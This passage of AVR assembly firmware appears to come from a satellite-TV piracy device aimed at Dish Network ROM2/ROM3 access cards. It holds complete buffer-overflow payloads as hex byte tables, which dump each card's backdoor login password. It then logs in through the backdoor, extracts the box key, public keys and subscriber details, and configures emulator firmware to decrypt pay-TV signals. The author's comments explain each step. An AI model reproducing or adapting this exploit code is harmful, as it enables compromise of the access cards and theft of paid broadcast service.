h0lp3:	rcall	ReadEEP
		ld	r17,y+
		cpse	r16,r17
		rjmp	h0_newcam
		dec	r18
		brne	h0lp3
		rjmp	h0_oldcam			; Login and get the keys only.  We're already configured.

; OK.  The CAM currently inserted is new.  Ahem, new only in that the EEP hasn't been configured for
; this particular CAM.  We should now read all the configuration information directly from the CAM.
; I use this CAMID check so this only gets done each time you insert a new CAM.  I simply don't like
; logging in and doing all this stuff each and every time.  Less chance for errors.
		
h0_newcam:	ldi	XL, low(eCAMID1)		; Write the CAM ID to EEP location #1.
		ldi	XH,high(eCAMID1)
		ldi	r18,0x04
		ldi	YL, low(sMsgBuf+2)
		ldi	YH,high(sMsgBuf+2)
h0lp4:	ld	r16,y+
		rcall	WriteEEP
		dec	r18
		brne	h0lp4

		ldi	XL, low(eCAMID2)		; Write the CAM ID to EEP location #2.
		ldi	XH,high(eCAMID2)
		ldi	r18,0x04
		ldi	YL, low(sMsgBuf+2)
		ldi	YH,high(sMsgBuf+2)
h0lp5:	ld	r16,y+
		rcall	WriteEEP
		dec	r18
		brne	h0lp5

; Next we must get the backdoor password and save it to EEP.  I have taken the buffer overflow and
; dump commands supplied to me by WatchDish and modified them so they only dump the 16 bytes of
; the backdoor login password.

		mov	r16,r6			; Get the ROM identifier from the ATR.
		cpi	r16,0x60			; ROM2
		breq	h0lp6
		cpi	r16,0x64			; ROM3
		breq	h0lp7

		ldi	r17,0x03			; ERROR: 03 - Not ROM2 or ROM3
		rjmp	h0_die
		

h0lp6:	rcall	bkrom2			; ROM2 buffer overflow / key dump
		rjmp	h0lp8

h0lp7:	rcall	bkrom3			; ROM3 buffer overflow / key dump

; Store the backdoor login password in the EEP.  Since we already have a backdoor login command
; stored in the EEP at h0_login lets just load our new password into the proper place in this
; command which I have labelled h0_key.  The rest of the command is generic to all CAMs.


h0lp8:	ldi	XL, low(h0_key)		; Write the BACKDOOR PASSWORD to EEP.
		ldi	XH,high(h0_key)
		ldi	r18,0x10			; 16 bytes in the password.
		rcall	InitYBuf
h0lp9:	ld	r16,y+
		rcall	WriteEEP
		dec	r18
		brne	h0lp9


; Login via the recently acquired backdoor password!

		ldi	XL, low(h0_login)
		ldi	XH,high(h0_login)
		rcall	h0_talk			; Transmit: 21 00 25 A0 20 00 00 20 {Rkey} {Ckey} LRC
		 					; Response: 12 00 02 90 00 80
		mov	r16,LEN			; LEN must be ----^^
		cpi	r16,0x02
		brne	h0lpA
		rcall	InitYBuf
		ld	r16,y+
		cpi	r16,0x90			; Must get: 90 00 "Command completed successfully."
		brne h0lpA
		ld	r16,y+
		cpi	r16,0x00
		breq h0lpB

h0lpA:	ldi	r17,0x04			; ERROR: 04 - Can't login via backdoor.
		rjmp	h0_die

; We're logged in. Before we can start reading data from the CAM we must initialize the CAM's
; EEP pointer to $E000.  This is a pretty generic command.  "Just do it".

h0lpB:	ldi	XL, low(h0_rsetup)
		ldi	XH,high(h0_rsetup)
		rcall	h0_talk			; Transmit: 21 00 07 A0 B0 94 00 00 00 01 LRC
							; Response: 12 40 03 XX 90 00 LRC
		mov	r16,LEN			; LEN must be ----^^
		cpi	r16,0x03
		breq	h0lpD
		
		ldi	r17,0x05			; ERROR: 05 - Problem with read setup command.
		rjmp	h0_die


; OK.  At this point, we have got an ATR.  Determined ROM2/3.  Overflowed to get the
; backdoor login password.  Successfully logged in, and sent the read setup command.
; We can now read data from the CAM to our hearts content. I wrote a handy routine called
; h0_gimme which takes XL/XH as the offset into the EEP we want and reads it.  Data will be
; returned in RAM at address sMsgBuf.  NAD,PCB and LEN are stripped off so the actual
; data starts at sMsgBuf.  Note: We have to be careful not to read too many bytes at once or
; we will get chained messages... and I am too lazy to write the code for that.

; Next we want to get a $01 data item.  So far I have never encountered a CAM where the
; very first data item wasn't the $01.  I really don't like doing this, however any time
; you write a NE2/NE3 file to your CAM... you're trusting that certin data items are
; stored in the same place, time after time.  We should be safe assuming the $01 data
; item comes first.  We will however take advantage of a pointer at CAM EEP address
; $E030 which points to the data area.  For ROM3: $E400, ROM2: $E933.
;
; This brings up an interesting point.  If dish want's to reduce the available space
; for data items, the can move all the data items up and then move the start of the
; database.  This actually happend with ROM2.  A friend got an old ROM2 Rev 048 CAM
; and luckily he gave it to me to check before he started writing NE2 files to it.
; The start of data items for a ROM2 Rev 048 is $E8D9.  They moved the data items
; up to make space for more bugcatchers.  Couldn't they do this again and in so doing
; close ROM2's.  I think they could if they wanted to.

h0lpD:	ldi	XL,0x30
		ldi	XH,0x00
		rcall	h0_gimme			; Response: 12 40 1A
;                                                     xx xx xx xx xx xx xx xx   << DATA
;                                                     xx xx xx xx xx xx xx xx   << DATA
;                                                     xx xx xx xx xx xx xx xx   << DATA
;                                                     90 00 LRC
		mov	r16,LEN			; LEN must be ----^^ (look up 5 lines)
		cpi	r16,0x1A
		breq	h0lpE
		
		ldi	r17,0x06			; ERROR: 06 - Can't read Data start location.
		rjmp	h0_die


; Now lets setup and read the address pointed to by ($E020).  First we will get the address
; subtract $E000 to get the offset and store it in R7/R8 for later use.

h0lpE:	ldi	ZL, low(sMsgBuf)
		ldi	ZH,high(sMsgBuf)
		ld	XH,z+
		subi	XH,0xE0			; Strip off the "Exxx" to yield "0xxx"
		mov	r8,XH				; save it for later use.
		ld	XL,z+
		mov	r7,XL				; save it for later use.
		rcall	h0_gimme

		mov	r16,LEN			; LEN Must always be $1A from h0_gimme. ;)
		cpi	r16,0x1A
		breq	h0lpQ
		
		ldi	r17,0x07			; ERROR: 07 - Can't read data item $01 IRD INFO.
		rjmp	h0_die

; We have read our $01 data item (IRD INFO).  More on that later.  First I want to
; setup the MCG306 enabler type.  I use Subbed Married for ROM3 and Ex-Subbed Married
; for ROM2.  We can use the value on R6 stored earlier to determine ROM2/ROM3.
;
; Something else i'm doing here that might not be apparent is that I am setting up
; ZL/ZH to point to the System Type in the $01 data item.  I show the ROM3 entry in
; my comments below, but what I haven't mentioned till now, is that for ROM2 it's at
; a slightly different offset from the start of data items.  For ROM3 it is
; $E403. For ROM2 it's at $E935.  Offset for ROM3=$0003 and ROM2=$0002.

h0lpQ:	ldi	ZL, low(sMsgBuf)
		ldi	ZH,high(sMsgBuf)
		mov	r16,r6			; Get ROM2/3 from ATR
		cpi	r16,0x60
		breq	h0lpF

; ROM3.  Use Subbed Married: $0A and an offset of: $03.

		adiw	ZL,0x03			; ROM3 offset for SYSTEM ID
		mov	r16,SID
		andi	r16,0x80
		ori	r16,0x0A			; Married Subbed for ROM3
		rjmp	h0lpG

; ROM2: Use Ex-Subbed Married: $02 and an offset of: $02.
		
h0lpF:	adiw	ZL,0x02			; ROM2 offset for SYSTEM ID
		mov	r16,SID
		andi	r16,0x80
		ori	r16,0x02			; Married Ex-Subbed for ROM2.

h0lpG:	ldi	XH,high(eEnabler)
		ldi	XL, low(eEnabler)
		rcall	WriteEEP

; Write CAM Key 0/1 selector.  Always use CAM Key 0 (If we use it at all.)

		ldi	XH,high(eCAMsKey)
		ldi	XL, low(eCAMsKey)
		ldi	r16,0x05			; $05 means CAM Key0, $15 means CAM Key1.
		rcall	WriteEEP
		
; A $01 data item for a ROM3 looks like this
;
; E400: 07                       - Flags
; E401: 27                       - Length of Data Item
; E402: 01                       - Data Item Type
; E403: 00 01                    - System Type: 00 01=Echo, 08 01=X
; E405: 00                       - IRD Status
; E406: 01                       - Free Access Group
; E407: 00 00 35 7C              - ZIP Code: $00 00 35 7C = 13692
; E40B: EC                       - Time Zone. EC=EST.
; E40C: 00                       - DVB deviation byte
; E40D: 31 62 0D 01              - IRD No. $01 0D 62 31. R0017654321
; E411: 31 32 30 42 42 55 42 41  - IRD bootstrap revision
; E419: 36 37 37 50 31 30 43 4E  - IRD firmware revision
; E421: FE ED BE EF F0 0D F0 0D  - IRD Box Key. ;)

		ld	r16,z+			; r16 is now 00 or 08 for Dish/X.
		mov	r9,r16			; save for future use.
		cpi	r16,0x00			; Dish Network.
		breq	h0lpH
		cpi	r16,0x08			; X
		breq	h0lpH
		
		ldi	r17,0x08
		rjmp	h0_die			; ERROR: 08 - not Dish or "Other" CAM.

; There are now 5 places in the Atmel's EEP that need to be configured for Network Type.

h0lpH:	ldi	XL, low(eFSID1)
		ldi	XH,high(eFSID1)
		rcall	WriteEEP

		inc	r16				; r16 now equals 01/09.
		ldi	XL, low(eSID1)
		ldi	XH,high(eSID1)
		rcall	WriteEEP
		
		ldi	XL, low(eSIDs)
		ldi	XH,high(eSIDs)
		rcall	WriteEEP
		
		ldi	XL, low(eSID2)
		ldi	XH,high(eSID2)
		rcall	WriteEEP

		ldi	XL, low(eSID3)
		ldi	XH,high(eSID3)
		rcall	WriteEEP

; Advance 3 bytes in the $01 data item and get the ZIP code.

		adiw	ZL,0x03			; ZIP Code.
		ldi	XL, low(eZIP)
		ldi	XH,high(eZIP)
		ld	r16,z+
		rcall	WriteEEP
		ld	r16,z+
		rcall	WriteEEP
		ld	r16,z+
		rcall	WriteEEP
		ld	r16,z+
		rcall	WriteEEP

; Time Zone follows right after.

		ldi	XL, low(eTZ)		; Write TZ.
		ldi	XH,high(eTZ)
		ld	r16,z+
		rcall	WriteEEP

; Advance 1 byte to get to the IRD.

		ld	r16,z+			; Skip DVB to get to IRD
		ldi	XL, low(eIRDrev)		; Write IRD
		ldi	XH,high(eIRDrev)
		ld	r16,z+
		rcall	WriteEEP
		ld	r16,z+
		rcall	WriteEEP
		ld	r16,z+
		rcall	WriteEEP
		ld	r16,z+
		rcall	WriteEEP

; Time to write the hash key.  I have preloaded the two most popular hash keys in the Atmel's EEP.
; We need to use the proper one for Dish/X.  Basically we need only move one of them to the proper
; place for MCG306.
;
; And for the first time in avrH.  Blackout Settings.  Correctly handle the proper Blackout String.

		ldi	XL, low(eBlkOut)
		ldi	XH,high(eBlkOut)
		ldi	r16,0xFF			; Take care of BlackOut String first.
		ldi	r18,0x03
		rcall	h0_www			; Both BlackOut Strings use FF FF FF to start.

		tst	r9				; 0=Dish, 8=*Other*.
		brne	h0lpI				; Branch if not $00 (Not Dish).

		ldi	r16,0x7F			; FF FF FF 7F 7F 7F 7F 7F 7F 7F 7F 7F 7F 7F 7F
		ldi	r18,0x0C
		rcall	h0_www

		ldi	XL, low(h0_hash0)		; Get Dish Network Hash Key
		ldi	XH,high(h0_hash0)
		rjmp	h0lpJ
		
h0lpI:	ldi	r16,0xB4			; FF FF FF B4 B4 B4 B4 B4 B4 B4 B4 B4 B4 B4 B4
		ldi	r18,0x0C
		rcall	h0_www

		ldi	XL, low(h0_hash8)		; Get X Hash Key.
		ldi	XH,high(h0_hash8)

h0lpJ:	rcall	InitYBuf			; Suck the Hash Key from the EEP
		ldi	r18,0x09
h0lpK:	rcall	ReadEEP			; Suck baby suck.  Blow is just an expression.
		st	y+,r16
		dec	r18
		brne	h0lpK
		
		ldi	XL, low(eHashKey)		; Write it back to the proper place for MCG306.
		ldi	XH,high(eHashKey)
		rcall	InitYBuf
		ldi	r18,0x09
h0lpL:	ld	r16,y+
		rcall	WriteEEP
		dec	r18
		brne	h0lpL

; Ok.  Due to my lazieness on the whole chained message deal, we have to issue another read command
; to the CAM in order to get the BOX KEY.  We saved the address of our $01 data item in R7/R8 earlier
; so let get it back... add the offset to the BOX KEY and read the key from the CAM.

		mov	XL,r7
		mov	XH,r8				; retrieve saved values

		mov	r16,r6			; Get ROM2/3 from ATR
		cpi	r16,0x60
		breq	h0lpM

		adiw	XL,0x01			; One more for ROM3 only.
		
h0lpM:	adiw	XL,0x20			; Read BoxKey
		rcall	h0_gimme
		
		mov	r16,LEN			; LEN Must always be $1A from h0_gimme. ;)
		cpi	r16,0x1A
		breq	h0lpR
		
		ldi	r17,0x09			; ERROR: 09 - Can't read the BOX KEY.
		rjmp	h0_die

h0lpR:	ldi	XL, low(eBoxKey)		; Write IRD Box Key
		ldi	XH,high(eBoxKey)
		rcall	InitYBuf
		ldi	r18,0x08
h0lpN:	ld	r16,y+
		rcall	WriteEEP
		dec	r18
		brne	h0lpN

; Man.  We're really cookin' now.  All that remains is to figure out where the heck
; our Public Keys 0 and 1 are stored and configure this one last thing.

; Lets cheat a little since I want to finish this and get on with my AutoRoll code.
; It's either going to be $EA3D for 99% of ROM2s OR for ROM3 we have two choices
; that again cover 99% of the CAMs out there. $E50F and $E508.  If we read CAM EEP
; address $E4E0 and it is $06 then we use the 2nd address for ROM3 ($E508), otherwise
; use $E50F.  Lets take care of ROM2 first.

		mov	r16,r6			; Get ROM2/3 from ATR
		cpi	r16,0x60
		brne	h0lpO				; Branch down to ROM3 handler.

		ldi	XL, low(h0_read+5)
		ldi	XH,high(h0_read+5)
		ldi	r16,0x0A			; remember to use $0A not $EA for offset!
		rcall	WriteEEP
		ldi	r16,0x3D
		rcall	WriteEEP			; $EA3D for 99% of ROM2s.
		rjmp	h0_oldcam

h0lpO:	ldi	XH,0x04			; ROM3:  First check $E4E0
		ldi	XL,0xE0
		rcall	h0_gimme

		mov	r16,LEN			; LEN Must always be $1A from h0_gimme. ;)
		cpi	r16,0x1A
		breq	h0lpS
		
		ldi	r17,0x0A			; ERROR: 10 - Problems locating data type $06.
		rjmp	h0_die

h0lpS:	rcall	InitYBuf
		ld	r16,y+
		cpi	r16,0x06			; if it's $06 then $E508 else $E50F
		brne	h0lpP
		
		ldi	XL, low(h0_read+5)
		ldi	XH,high(h0_read+5)
		ldi	r16,0x05
		rcall	WriteEEP
		ldi	r16,0x08
		rcall	WriteEEP			; $E508
		rjmp	h0_oldcam

h0lpP:	ldi	XL, low(h0_read+5)
		ldi	XH,high(h0_read+5)
		ldi	r16,0x05
		rcall	WriteEEP
		ldi	r16,0x0F
		rcall	WriteEEP			; $E50F
		rjmp	h0_oldcam			; That's all folks, i'm outta here.

; -------------------------------------------------------------------------------------------------------------
; -------------------------------------------------------------------------------------------------------------
; -------------------------------------------------------------------------------------------------------------

; The CAM currently inserted is one we have already configured ourselves for.  So there's
; no need to do anything except read the keys and fire up MCG306!  The code that follows
; is pretty much unchanged from V1.4

; --------------------------------- LOGIN ----------------------------------

h0_oldcam:	ldi	XL, low(h0_login)
		ldi	XH,high(h0_login)		; Transmit: 21 00 25 A0 20 00 00 20 {Rkey} {Ckey} LRC
		rcall	h0_talk			; Response: 12 00 02 90 00 80
		mov	r16,LEN
		cpi	r16,0x02			; LEN=$02 --------^^
		breq	h0lq7
		ldi	r17,0x0B			; ERROR: 11 - Backdoor Login Failure
		rjmp	h0_die
		
; --------------------------------- RSETUP ---------------------------------

h0lq7:	ldi	XL, low(h0_rsetup)
		ldi	XH,high(h0_rsetup)	; Transmit: 21 00 07 A0 B0 94 00 00 00 01 LRC
		rcall	h0_talk			; Response: 12 40 03 xx 90 00 LRC
		mov	r16,LEN
		cpi	r16,0x03			; LEN=$03 --------^^
		breq	h0lqD
		ldi	r17,0x0C			; ERROR: 12 - Read Setup Failure
		rjmp	h0_die

; --------------------------------- READ ---------------------------------

h0lqD:	ldi	XL, low(h0_read)
		ldi	XH,high(h0_read)		; Transmit: 21 00 07 A0 B0 94 HH LL 00 10 LRC
		rcall	h0_talk			; Response: 12 40 12 [16 bytes data] 90 00 LRC
		mov	r16,LEN
		cpi	r16,0x12			; LEN=$12 --------^^
		breq	h0lqE
		ldi	r17,0x0D			; ERROR: 13 - Read Keys Failure
		rjmp	h0_die

; -----------------------------------------------------------------------------------
; Write the keys back to the EEP. ePubKey0 for Dish and eAuxKey0 for everything else.

h0lqE:	ldi	XL, low(eFSID1)
		ldi	XH,high(eFSID1)
		rcall	ReadEEP
		tst	r16
		brne	h0lq8				; Branch if NOT DISH
		
		ldi	XL, low(ePubKey0)
		ldi	XH,high(ePubKey0)		; We must be Dish
		rjmp	h0lq9

h0lq8:	ldi	XL, low(eAuxKey0)		; We must be X.
		ldi	XH,high(eAuxKey0)

h0lq9:	ldi	r17,0x10
		rcall	InitYBuf
h0lqA:	ld	r16,y+
		rcall	WriteEEP
		dec	r17
		brne	h0lqA

; -----------------------------------------------------------------------
; Write KEY0 to eCAMPub **ONLY for Subbed married and Subbed non-married.

		ldi	XL, low(eEnabler)
		ldi	XH,high(eEnabler)
		rcall	ReadEEP
		andi	r16,0x0f
		cpi	r16,0x0e			; Subbed Not Married needs CAM_Key0
		breq	h0lqB
		cpi	r16,0x0a			; Subbed Married also need CAM_Key0
		brne	h0done
		
h0lqB:	ldi	XL, low(eCAMPub)
		ldi	XH,high(eCAMPub)
		ldi	r17,0x08
		rcall	InitYBuf
h0lqC:	ld	r16,y+
		rcall	WriteEEP
		dec	r17
		brne	h0lqC

h0done:	rjmp	Ext_RST			; Fire up MCG306!


; =============================================================================================================
; =============================================================================================================
; =============================================================================================================
;
;                     ************** Now for some subroutines that I have written. **************
;
; =============================================================================================================


; =============================================================================================================
;
; h0_www - Write the byte stored in R16 to the EEP location XL/XH and do it R18 times.

h0_www:	rcall	WriteEEP
		dec	r18
		brne	h0_www
		ret


; =============================================================================================================
;
; h0_atr - Reset the CAM and read the ATR.


h0_atr:	nop				; Wait a couple cycles and then force a CAM reset
		nop				; we want to do this to make absolutely sure the CAM
		nop				; has just been RESET before we start receiving the ATR
		nop				; otherwise some of the ATR bytes may be missed.
		
		rcall	h0_rst		; Make damn sure the CAM gets fully reset.

; -------------------------------------------------------------------------------------------------------------
; The CAM has just come out of a RESET and now it's time to start receiving an ATR.  Lets begin by
; waiting for the START BIT.  ISO7816 spec. says that if the start bit isn't found within 40,000
; cycles then we might as well forget it.  Card's looped or something.  :(
;
; After that however, we need only wait 9,600 cycles between bytes, otherwise the ATR is finished.
; Finally an ATR must not be more than 32 bytes.  These conditions are used in the code that
; follows.  It might be hard to follow, but what i'm doing is using the timer0 and it's associated
; overflow flag for an easy way to measure elapsed time.  Now the timer has several divisors that
; allow for large amounts of time and for the ATR i'm using /256. This means that for 9,600 cycles
; we must allow the timer to count up 9600/256=37.5.  Also keep in mind that the timer counts up.
; The overflow occurs when it rolls up from 255 and wraps around to 0.  So to get 37 ticks on the
; timer (before the overflow) we better start it at 256-37=216=$DB.

		ldi	XL, low(sTemp)
		ldi	XH,high(sTemp)
		clr	r16
		out	TCCR0,r16		; Stop TIMER0!
		ldi	r16,0x64		; 40000/256=156. (256-156)=100=$64. 
		out	TCNT0,r16		; Reset TIMER0 to 0x80.
		in	r16,TIFR		; Clear the TOV0 flag.
		ori	r16,TOV0
		out	TIFR,r16
		ldi	r16,0x04		; Start TIMER0 at CK/256
		out	TCCR0,r16		; Initial timeout is 40,000 cycles.

atrGET:	sbrc	SID, 7		; 1=AVR3, 0=Blocker board (skip if Blocker)
		rjmp	atrAVR

atrBLK:	sbis	PIND,0		; Do we have a START bit. (0=blocker,4=avr)
		rjmp	atrG1			; Yes
		rjmp	atrG0			; No

atrAVR:	sbis	PIND,4		; Do we have a START bit. (4=avr,0=blocker)
		rjmp	atrG1			; Yes
atrG0:	in	r16,TIFR		; No
		sbrc	r16,TOV0		; Do we have a TIMEOUT?
		rjmp	atrDONE		; Yes: ATR is done or we have a looped CAM.
		rjmp	atrGET		; No:  Keep waiting for more bytes!

; Now lets waste half a bit time so we are in the middle of our bits when we decide to sample them.
; One bit time is 372 clocks.

atrG1:	ldi	r16,0x2e
atrG2:	nop
		dec	r16
		brne	atrG2
		ldi	r17,0x08		; 8 bits per byte.

atrG3:	ldi	r16,0x5a
atrG4:	nop
		dec	r16
		brne	atrG4

		lsl	r18			; ADD byte,byte
		sbrc	SID, 7		; 1=AVR3, 0=Blocker board (skip if Blocker)
		rjmp	bitAVR


bitBLK:	sbic	PIND,0		; 0=blocker, 4=avr
		andi	r18,0xFE		; cbr byte,0x01
		sbis	PIND,0		; 0=blocker, 4=avr
		ori	r18,0x01		; sbr	byte,0x01
		rjmp	bitNEXT

bitAVR:	nop
		sbic	PIND,4		; 4=avr, 0=blocker
		andi	r18,0xFE		; cbr byte,0x01
		sbis	PIND,4		; 4=avr, 0=blocker
		ori	r18,0x01		; sbr	byte,0x01

bitNEXT:	dec	r17
		brne	atrG3
		ldi	r16,0xb6
atrG5:	nop
		dec	r16
		brne	atrG5

		st	X+,r18
		ldi	r16,0xDB		; 9600/256=37.  (256-37)=219=$DB.
		out	TCNT0,r16

		cpi	XH,high(sTemp+32)
		brne	atrGET
		cpi	XL, low(sTemp+32)	; max 32 bytes.
		brne	atrGET

; Timeout waiting for ATR data from the CAM.  9,600 cycles elapsed... OR 32 bytes received.
;  So store whatever we got in the EEP and bail.

atrDONE:	subi	XL, low(sTemp)
		sbci	XH,high(sTemp)
		mov	r17,XL		; Number of bytes received.
		ret

; =============================================================================================================
;
; h0_talk:  Load XL,XH with the Atmel's EEP address of the command you want to send to the CAM.
;           You don't need to reserve space for the LRC since it's calculated before transmitting.

h0_talk:	rcall	ReadEEP
		mov	NAD,r16		; NAD
		rcall ReadEEP
		mov	PCB,r16		; PCB
		rcall ReadEEP
		mov	LEN,r16		; LEN
		mov	r17,LEN
		rcall	InitYBuf

h0_lrc1:	rcall	ReadEEP
		st	y+,r16
		dec	r17
		brne	h0_lrc1
		rjmp	TalkWithCAM


; =============================================================================================================
;
; h0_gimme:  Load XL/XH with the two byte offset into the CAM and this routine will construct
;            a read command, calculate the LRC and read the data to RAM at sMsgBuf.

h0_gimme:	ldi	r16,0x21
		mov	NAD,r16
		ldi	r16,0x00
		mov	PCB,r16
		ldi	r16,0x07
		mov	LEN,r16
		rcall	InitYBuf
		ldi	r16,0xA0
		st	y+,r16
		ldi	r16,0xB0
		st	y+,r16
		st	y+,XH
		st	y+,XL
		ldi	r16,0x00
		st	y+,r16
		st	y+,r16
		ldi	r16,0x18		; Get as much as we can without chaining. ;)
		st	y+,r16
		rjmp	TalkWithCAM

; =============================================================================================================
;
; h0_rst:  This routine makes sure the CAM gets reset.  For avrH boards it is real easy.  Throw PD5
;          low for a couple cycles... then high.  For blocker boards, we must wait for PD3 to be high.
;          Then wait for it to go low.  What this does is make sure we catch the leading edge of an
;          IRD reset cycle.  Quickly set PD5 high so the 4066 connects IRD_RESET <> CAM_RESET.  The
;          CAM will now get a RESET signal.  Wait a couple cycles and then set PD5 low to break the
;          connection.

h0_rst:	sbrc	SID, 7	; 1=AVR3, 0=Blocker board (skip if Blocker)
		rjmp	h0rs2
		
; BLOCKER board CAM RESET code

h0rs0:	sbis	PIND,3	; wait for IRD reset to go HIGH (non-reset)
		rjmp	h0rs0
		
h0rs1:	sbic	PIND,3	; wait for IRD reset to go LOW (reset!)
		rjmp	h0rs1

		sbi	PORTD,5	; Connect the IRD to the CAM.  Warning: I/O is also connected!
		nop
		nop
		nop
		nop
		cbi	PORTD,5	; Give a couple cycles for reset then break the connection.
		ret			; This kinda sucks.  Makes the light blink though!
		
; AVR3 (avrH) board CAM RESET code

h0rs2:	cbi	PORTD,5	; Force CAM reset LOW
		nop
		nop
		nop
		nop
		sbi	PORTD,5	; Force CAM reset HIGH
		ret			; That was easy.

; =============================================================================================================
;
; h0_die:  This routine is called when we want a failure state.  It writes the error code to the
;          EEP under TZ and then loops.  Reading the chip later lets you know what went wrong

h0_die:	ldi	XL, low(eZip)		; Write the ZIP code to EEP.
		ldi	XH,high(eZip)
		ldi	r16,0x00
		rcall	WriteEEP
		rcall	WriteEEP
		rcall	WriteEEP
		mov	r16,r17
		rcall	WriteEEP
loop:		rjmp	loop				; Wait for sun to supernova, or newbies to post:
							; All I get is "Card is not inserted correctly."


; =============================================================================================================
;
; bkrom2: This routine sends the buffer overflow / backdoor password dump command for ROM2

bkrom2:	ldi	ZL, low(h0_rom2 * 2)
		ldi	ZH,high(h0_rom2 * 2)
		rjmp	bkdump
;
; bkrom3: This routine sends the buffer overflow / backdoor password dump command for ROM3

bkrom3:	ldi	ZL, low(h0_rom3 *2)
		ldi	ZH,high(h0_rom3 *2)

bkdump:	ldi	r18,0			; lrc=0
		lpm
		adiw	ZL,1
		mov	r16, r0		; NAD
		eor	r18,r16
		rcall	TX_CAM		; Transmit NAD.
		
		lpm
		adiw	ZL,1
		mov	r16, r0		; PCB
		eor	r18,r16
		rcall	TX_CAM		; Transmit PCB.
		
		lpm
		adiw	ZL,1
		mov	r16, r0		; LEN
		mov	r17, r0
		eor	r18,r16
		rcall	TX_CAM		; Transmit LEN

bk0:		lpm				; Get a byte of the CMD in r0
		adiw	ZL, 1			; 16 bit increment of Z
		mov	r16, r0
		eor	r18,r16		; You know I forgot this line and it still worked!!! Hmmm.
		rcall	TX_CAM		; Transmit DATA.
		dec	r17
		brne	bk0
		
		mov	r16,r18
		rcall	TX_CAM		; Transmit LRC. (I have the feeling this isn't needed)

		rcall	RX_CAM		; 1
		rcall	RX_CAM		; 2
		rcall	RX_CAM		; 3
		rcall	RX_CAM		; 4 - There's always 4 bytes of garbage to ignore.

		ldi	r18,0x10		; 16 bytes in the password.
		rcall	InitYbuf

bk1:		rcall	RX_CAM
		st	Y+, r16
		dec	r18
		brne	bk1

		rjmp	h0_atr	; reset the CAM, read the ATR and RET.

; =============================================================================================================

; Here are the buffer overflow CAM dump commands.  These are modified versions designed specifically
; to dump only the backdoor login password.  They were actually kinda fun to modify as I had to write
; some 6805 code.  I particularly enjoyed calculating the branch offsets in my head.  Been about
; 20 years now since I wrote assembly in hex.
		
h0_rom2:
.db 0x21,0x00,0xBC,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x30,0x31,0x32,0x33,0x34
.db 0x35,0x36,0x37,0x41,0x42,0x43,0x44,0x45
.db 0x46,0x47,0x48,0x01,0x01,0x00,0x00,0x00
.db 0x00,0xFF,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0xC3,0xC6,0xE0,0x20,0xCD,0x43
.db 0x0F,0xBE,0x66,0x5C,0xBF,0x66,0xA3,0x30
.db 0x26,0xF1,0x9B,0xCC,0x00,0x74,0x9D,0x9D
.db 0x9D,0x00,0x00,0x00,0x00,0x00,0x64,0x00

h0_rom3:
.db 0x21,0x00,0xC4,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x30
.db 0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x41
.db 0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x01
.db 0x01,0x00,0x00,0x00,0x00,0xFF,0x00,0x00
.db 0x00,0x00,0x00,0xCD,0x00,0x00,0xC3,0x9B
.db 0x9C,0x9D,0x9D,0xC6,0xE0,0x20,0xCD,0x42
.db 0xD7,0xBE,0x66,0x5C,0xBF,0x66,0xA3,0x30
.db 0x26,0xF1,0x9A,0xCC,0x73,0x81,0x00,0x00
.db 0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00

;
; *h0rhay* CHANGES  END  [6/7]
; *+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*+*

	.org 0x0F80

; S-box	tables
; This 256-byte	block of data represents the S-box tables for the E*
; pseudo-DES encryption	algorithm.  Although the "official" DES specification
; calls	for 8 s-box tables with	64 entries each	(a total of 512	entries),
; each entry is	only 4 bits long.  As a	result,	it's possible to concatentate
; the 8	32-entry s-boxes into a	single 256-byte	table, where four of the
; s-boxes are stored in	the lower nibbles of the table data and	four of	them
; are stored in	the upper nibbles of the table data.  In the case of the
; E* implementation, s-boxes 1,	3, 5, and 7 are	stored in the lower nibbles
; of each of the bytes,	and are	organized in direct sequence (ie., bytes
; 00 ..	3F contain s-box 1, 40 .. 7F contain s-box 3, and so on.)  The
; other	4 s-boxes are organized	a little differently: They occupy every
; 4th high nibble.  For	example, s-box 2 is stored in the high nibble of
